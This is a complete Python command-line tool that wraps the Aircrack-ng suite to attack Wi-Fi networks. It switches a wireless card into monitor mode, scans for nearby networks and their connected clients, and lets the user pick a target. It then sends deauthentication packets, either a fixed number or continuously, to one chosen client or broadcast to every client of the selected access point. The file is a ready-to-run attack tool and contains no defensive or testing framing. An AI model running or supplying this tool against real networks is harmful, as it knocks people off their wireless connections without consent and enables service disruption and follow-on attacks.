#!/usr/bin/env python3
"""
Network Deauthentication Script
This script allows monitoring wireless networks and performing deauthentication attacks
"""

import os
import sys
import argparse
import subprocess
import tempfile
import csv
import time
import signal
import re
import shutil
from pathlib import Path
from typing import List, Dict, Tuple, Optional

# Colors for better readability
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    NC = '\033[0m'  # No Color

# Global variables
temp_dir = None
monitor_interface = ""
target_bssid = ""
target_channel = ""
target_essid = ""

def print_colored(text: str, color: str) -> None:
    """Print text with color"""
    print(f"{color}{text}{Colors.NC}")

def print_table_header(format_str: str, header: List[str], separator: List[str]) -> None:
    """Print a formatted table header"""
    print(f"\n{Colors.GREEN}{format_str.format(*header)}{Colors.NC}")
    print(f"{Colors.GREEN}{format_str.format(*separator)}{Colors.NC}")

def print_table_row(color: str, format_str: str, *args) -> None:
    """Print a formatted table row with color"""
    print(f"{color}{format_str.format(*args)}{Colors.NC}")

def run_command(cmd: List[str], verbose: bool = False) -> Tuple[int, str, str]:
    """Run a command and return return code, stdout, stderr"""
    try:
        if verbose:
            print_colored(f"Running: {' '.join(cmd)}", Colors.BLUE)
        
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        stdout, stderr = process.communicate()
        return process.returncode, stdout, stderr
    except Exception as e:
        return 1, "", str(e)

def check_requirements() -> bool:
    """Check if required tools are installed"""
    print_colored("Checking requirements...", Colors.BLUE)
    
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng"]
    missing = False
    
    for tool in tools:
        if shutil.which(tool) is None:
            print_colored(f"Missing required tool: {tool}", Colors.RED)
            missing = True
    
    if missing:
        print_colored("Please install Aircrack-ng suite: apt install aircrack-ng", Colors.RED)
        return False
    
    return True

def get_wireless_interfaces() -> List[str]:
    """Return list of wireless interfaces"""
    interfaces = []
    
    # Method 1: Use iw command if available
    if shutil.which("iw"):
        rc, stdout, _ = run_command(["iw", "dev"])
        if rc == 0:
            for line in stdout.splitlines():
                match = re.search(r'^\s*Interface\s+(\S+)', line)
                if match:
                    interfaces.append(match.group(1))
    
    # Method 2: Check for interfaces with wireless capabilities
    if not interfaces:
        for path in Path("/sys/class/net").glob("*"):
            if (path / "wireless").exists() or (path / "phy80211").exists():
                interfaces.append(path.name)
    
    # Method 3: Check for wlan interfaces
    if not interfaces:
        for path in Path("/sys/class/net").glob("wlan*"):
            if path.exists():
                interfaces.append(path.name)
    
    return interfaces

def show_interfaces() -> List[str]:
    """Display available wireless interfaces and return them"""
    print_colored("Detecting network interfaces...", Colors.BLUE)
    
    interfaces = get_wireless_interfaces()
    
    if interfaces:
        print_colored("Available wireless interfaces:", Colors.GREEN)
        for i, iface in enumerate(interfaces, 1):
            print_colored(f"{i}. {iface}", Colors.BLUE)
        return interfaces
    
    # Fall back to showing all interfaces
    print_colored("No wireless interfaces detected.", Colors.YELLOW)
    print_colored("Showing all network interfaces:", Colors.YELLOW)
    
    interfaces = []
    rc, stdout, _ = run_command(["ip", "link", "show"])
    if rc == 0:
        for line in stdout.splitlines():
            match = re.search(r'^[0-9]+:\s+([^:]+):', line)
            if match:
                iface = match.group(1)
                # Skip loopback and virtual interfaces
                if (iface != "lo" and not iface.startswith(("veth", "docker", "br"))):
                    interfaces.append(iface)
    
    if interfaces:
        for i, iface in enumerate(interfaces, 1):
            print_colored(f"{i}. {iface}", Colors.BLUE)
        return interfaces
    
    print_colored("No usable network interfaces found.", Colors.RED)
    return []

def select_interface(specified_interface: Optional[str] = None) -> bool:
    """Select a network interface and enable monitor mode"""
    global monitor_interface
    
    if specified_interface:
        interface = specified_interface
        print_colored(f"Using specified interface: {interface}", Colors.BLUE)
    else:
        interfaces = show_interfaces()
        if not interfaces:
            return False
        
        print_colored("Enter the number of the interface to use (or 'q' to quit):", Colors.GREEN)
        choice = input("> ")
        
        if choice.lower() == 'q':
            print_colored("Exiting...", Colors.BLUE)
            sys.exit(0)
        
        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(interfaces):
                print_colored("Invalid selection.", Colors.RED)
                return False
            interface = interfaces[idx]
        except ValueError:
            print_colored("Invalid selection. Please enter a number.", Colors.RED)
            return False
    
    # Check if interface exists
    rc, _, _ = run_command(["ip", "link", "show", interface])
    if rc != 0:
        print_colored(f"Interface {interface} does not exist.", Colors.RED)
        return False
    
    # Put interface in monitor mode
    print_colored(f"Putting {interface} into monitor mode...", Colors.BLUE)
    run_command(["airmon-ng", "check", "kill"])
    run_command(["airmon-ng", "start", interface])
    
    # Find the monitor interface name
    possible_names = [f"{interface}mon", "mon0", f"{interface}mon0", interface]
    monitor_interface = None
    
    for name in possible_names:
        rc, _, _ = run_command(["ip", "link", "show", name])
        if rc == 0:
            monitor_interface = name
            break
    
    if not monitor_interface:
        print_colored("Failed to create monitor interface. Please check your wireless card supports monitor mode.", Colors.RED)
        return False
    
    print_colored(f"Monitor interface: {monitor_interface}", Colors.GREEN)
    return True

def scan_networks() -> bool:
    """Scan for wireless networks"""
    global temp_dir
    
    print_colored(f"Scanning for wireless networks on {monitor_interface}...", Colors.BLUE)
    print_colored("Press Enter when you want to stop scanning.", Colors.YELLOW)
    
    scan_file = os.path.join(temp_dir, "network_scan")
    
    # Start airodump-ng in background
    process = subprocess.Popen(
        ["airodump-ng", "-w", scan_file, "--output-format", "csv", monitor_interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Monitor networks count in real-time
    try:
        prev_count = 0
        input_ready = False
        
        while process.poll() is None and not input_ready:
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                current_count = 0
                with open(csv_file, 'r', errors='replace') as f:
                    for line in f:
                        if line.strip() and not line.startswith(("BSSID", "Station MAC")):
                            current_count += 1
                
                if current_count != prev_count:
                    print(f"\r{Colors.GREEN}Networks found: {current_count} {Colors.NC}", end="  ")
                    prev_count = current_count
            
            # Check if user pressed Enter (non-blocking)
            import select
            if select.select([sys.stdin], [], [], 0.5)[0]:
                input()  # Consume the enter key press
                input_ready = True
    except KeyboardInterrupt:
        pass
    finally:
        process.terminate()
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
    
    # Clear the line and print newline
    print("\r\033[K")
    
    # Parse and display networks from CSV file
    csv_file = f"{scan_file}-01.csv"
    if not os.path.exists(csv_file):
        print_colored("No networks found or scan interrupted.", Colors.RED)
        return False
    
    networks = []
    try:
        with open(csv_file, 'r', errors='replace') as f:
            # Skip to the networks section
            in_stations_section = False
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                if "Station MAC" in line:
                    in_stations_section = True
                    continue
                
                if not in_stations_section and not line.startswith("BSSID"):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        if len(bssid) >= 17:  # MAC address is at least 17 chars with colons
                            network = {
                                'bssid': bssid,
                                'channel': parts[3].strip(),
                                'power': parts[8].strip(),
                                'encryption': parts[5].strip() + ' ' + parts[6].strip(),
                                'essid': parts[13].strip()
                            }
                            networks.append(network)
    except Exception as e:
        print_colored(f"Error parsing network data: {e}", Colors.RED)
        return False
    
    if not networks:
        print_colored("No networks found in scan results.", Colors.RED)
        return False
    
    # Save networks to file for later selection
    networks_file = os.path.join(temp_dir, "available_networks.txt")
    with open(networks_file, 'w') as f:
        for idx, network in enumerate(networks, 1):
            f.write(f"{idx};{network['bssid']};{network['channel']};{network['power']};" +
                    f"{network['encryption']};{network['essid']}\n")
    
    print_colored(f"Scan complete. Found {len(networks)} networks.", Colors.GREEN)
    
    # Display table of networks
    print_table_header("%-4s %-18s %-8s %-8s %-10s %s", 
                       ["No.", "BSSID", "Channel", "Power", "Encryption", "ESSID"],
                       ["===", "==================", "========", "========", "==========", "====="])
    
    for idx, network in enumerate(networks, 1):
        # Better encryption info
        encryption = "Open"
        if "WPA2" in network['encryption']:
            encryption = "WPA2"
        elif "WPA" in network['encryption']:
            encryption = "WPA"
        elif "WEP" in network['encryption']:
            encryption = "WEP"
        
        # Format power value
        power = f"{network['power']}dBm"
        
        print_table_row(Colors.BLUE, "%-4s %-18s %-8s %-8s %-10s %s",
                       f"{idx}.", network['bssid'], f"Ch:{network['channel']}", power, encryption, network['essid'])
    
    print()
    return True

def select_target() -> bool:
    """Select target network and scan for clients"""
    global temp_dir, target_bssid, target_channel, target_essid
    
    print_colored("Enter the number of the network to target:", Colors.GREEN)
    target_num = input("> ")
    
    try:
        target_idx = int(target_num)
    except ValueError:
        print_colored("Invalid selection.", Colors.RED)
        return False
    
    # Get the selected network's info
    networks_file = os.path.join(temp_dir, "available_networks.txt")
    selected_network = None
    
    with open(networks_file, 'r') as f:
        for line in f:
            parts = line.strip().split(';')
            if int(parts[0]) == target_idx:
                selected_network = parts
                break
    
    if not selected_network:
        print_colored("Invalid selection.", Colors.RED)
        return False
    
    # Extract BSSID, channel and ESSID
    target_bssid = selected_network[1]
    target_channel = selected_network[2]
    target_essid = selected_network[5]
    
    print_colored(f"Selected target network: {Colors.BLUE}{target_essid}{Colors.NC} " +
                 f"(BSSID: {Colors.BLUE}{target_bssid}{Colors.NC}, " +
                 f"Channel: {Colors.BLUE}{target_channel}{Colors.NC})", Colors.GREEN)
    
    # Start client scan
    print_colored(f"Scanning for clients on {target_essid}...", Colors.BLUE)
    print_colored("Press Enter to stop scanning for clients...", Colors.YELLOW)
    
    client_scan_file = os.path.join(temp_dir, "client_scan")
    
    process = subprocess.Popen(
        ["airodump-ng", "-c", target_channel, "--bssid", target_bssid, 
         "-w", client_scan_file, "--output-format", "csv", monitor_interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    try:
        input()
    except KeyboardInterrupt:
        pass
    finally:
        process.terminate()
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
    
    # Parse client information from CSV
    csv_file = f"{client_scan_file}-01.csv"
    if not os.path.exists(csv_file):
        print_colored("No client scan data available.", Colors.RED)
        return False
    
    clients = []
    try:
        with open(csv_file, 'r', errors='replace') as f:
            # Skip to the clients section
            in_stations_section = False
            for line in f:
                line = line.strip()
                if not line:
                    continue
                
                if "Station MAC" in line:
                    in_stations_section = True
                    continue
                
                if in_stations_section:
                    parts = line.split(',')
                    if len(parts) >= 6:
                        mac = parts[0].strip()
                        if len(mac) >= 17:  # MAC address is at least 17 chars with colons
                            client = {
                                'mac': mac,
                                'power': parts[3].strip(),
                                'packets': parts[4].strip()
                            }
                            clients.append(client)
    except Exception as e:
        print_colored(f"Error parsing client data: {e}", Colors.RED)
    
    # Save clients to file for later selection
    clients_file = os.path.join(temp_dir, "available_clients.txt")
    with open(clients_file, 'w') as f:
        for idx, client in enumerate(clients, 1):
            f.write(f"{idx};{client['mac']};{client['power']};{client['packets']}\n")
    
    # Check if we found any clients
    if not clients:
        print_colored("No clients found for this network.", Colors.YELLOW)
        print("0. Continue anyway (broadcast deauth)")
        print("1. Scan again for clients") 
        print("2. Select another network")
        print("3. Quit")
        
        option = input("Select option [0-3]: ")
        
        if option == "0":
            return True
        elif option == "1":
            return select_target()
        elif option == "2":
            if scan_networks():
                return select_target()
            return False
        else:
            print_colored("Quitting...", Colors.RED)
            return False
    
    print_colored("Found clients:", Colors.GREEN)
    
    # Display clients table
    print_table_header("%-4s %-18s %-10s %-10s", 
                      ["No.", "MAC Address", "Power", "Packets"],
                      ["===", "==================", "==========", "=========="])
    
    for idx, client in enumerate(clients, 1):
        power = f"{client['power']} dBm"
        print_table_row(Colors.BLUE, "%-4s %-18s %-10s %-10s", 
                      f"{idx}.", client['mac'], power, client['packets'])
    
    print()
    return True

def perform_deauth() -> bool:
    """Perform deauthentication attack"""
    print_colored("Enter number of deauth packets to send (0 for continuous):", Colors.GREEN)
    try:
        packet_count = int(input("> "))
        continuous = (packet_count == 0)
    except ValueError:
        print_colored("Invalid input. Using default of 10 packets.", Colors.RED)
        packet_count = 10
        continuous = False
    
    print_colored("Select client to deauthenticate:", Colors.GREEN)
    print("0. All clients (broadcast deauth)")
    
    # Show clients table if available
    clients_file = os.path.join(temp_dir, "available_clients.txt")
    if os.path.exists(clients_file):
        # Display clients table
        print_table_header("%-4s %-18s %-10s %-10s", 
                          ["No.", "MAC Address", "Power", "Packets"],
                          ["===", "==================", "==========", "=========="])
        
        with open(clients_file, 'r') as f:
            for line in f:
                num, mac, power, packets = line.strip().split(';')
                power = f"{power} dBm"
                print_table_row(Colors.BLUE, "%-4s %-18s %-10s %-10s", 
                              f"{num}.", mac, power, packets)
        
        print()
    
    client_choice = input("> ")
    
    if client_choice == "0":
        print_colored("Sending deauthentication packets to all clients...", Colors.YELLOW)
        if continuous:
            print_colored("Press Ctrl+C to stop the attack", Colors.RED)
            cmd = ["aireplay-ng", "--deauth", "0", "-a", target_bssid, monitor_interface]
        else:
            cmd = ["aireplay-ng", "--deauth", str(packet_count), "-a", target_bssid, monitor_interface]
        
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nInterrupted by user.")
    else:
        # Get the selected client MAC
        client_mac = None
        try:
            choice_num = int(client_choice)
            with open(clients_file, 'r') as f:
                for line in f:
                    parts = line.strip().split(';')
                    if int(parts[0]) == choice_num:
                        client_mac = parts[1]
                        break
        except (ValueError, FileNotFoundError):
            pass
        
        if not client_mac:
            print_colored("Invalid selection.", Colors.RED)
            return False
        
        print_colored(f"Sending deauthentication packets to client {client_mac}...", Colors.YELLOW)
        
        if continuous:
            print_colored("Press Ctrl+C to stop the attack", Colors.RED)
            cmd = ["aireplay-ng", "--deauth", "0", "-a", target_bssid, "-c", client_mac, monitor_interface]
        else:
            cmd = ["aireplay-ng", "--deauth", str(packet_count), "-a", target_bssid, "-c", client_mac, monitor_interface]
        
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nInterrupted by user.")
    
    print_colored("Deauth attack completed.", Colors.GREEN)
    return True

def cleanup():
    """Clean up resources before exiting"""
    global temp_dir, monitor_interface
    
    print_colored("Cleaning up...", Colors.BLUE)
    
    # Stop monitor mode if we created a monitor interface
    if monitor_interface:
        print_colored(f"Stopping monitor mode on {monitor_interface}...", Colors.BLUE)
        run_command(["airmon-ng", "stop", monitor_interface])
    
    # Remove temporary directory
    if temp_dir and os.path.exists(temp_dir):
        import shutil
        shutil.rmtree(temp_dir)
    
    print_colored("Done.", Colors.GREEN)

def main():
    """Main function"""
    global temp_dir
    
    # Check if running as root
    if os.geteuid() != 0:
        print_colored("Error: Please run as root", Colors.RED)
        sys.exit(1)
    
    print_colored("========================================", Colors.GREEN)
    print_colored("   Network Deauthentication Script      ", Colors.GREEN)
    print_colored("========================================", Colors.GREEN)
    
    # Set up argument parser
    parser = argparse.ArgumentParser(description='Network Deauthentication Tool')
    parser.add_argument('-i', '--interface', help='Specify wireless interface')
    parser.add_argument('-h', '--help', action='store_true', help='Show this help message')
    args = parser.parse_args()
    
    if args.help:
        parser.print_help()
        sys.exit(0)
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp(prefix="netdeauth_")
    
    # Register cleanup handler
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    
    try:
        # Check requirements
        if not check_requirements():
            sys.exit(1)
        
        # Main program loop
        while True:
            if select_interface(args.interface):
                if scan_networks():
                    if select_target():
                        perform_deauth()
                        
                        print_colored("What would you like to do next?", Colors.GREEN)
                        print("1. Perform another deauth attack on same network")
                        print("2. Select another network")
                        print("3. Select another interface")
                        print("4. Exit")
                        
                        next_action = input("Select option [1-4]: ")
                        
                        if next_action == "1":
                            continue
                        elif next_action == "2":
                            scan_networks()
                            continue
                        elif next_action == "3":
                            pass  # Will go back to interface selection
                        else:
                            print_colored("Exiting...", Colors.BLUE)
                            break
            
            try_again = input(f"{Colors.GREEN}Would you like to try again? (y/n){Colors.NC}\n> ")
            if try_again.lower() != "y":
                print_colored("Exiting...", Colors.BLUE)
                break
    finally:
        cleanup()

if __name__ == "__main__":
    main()
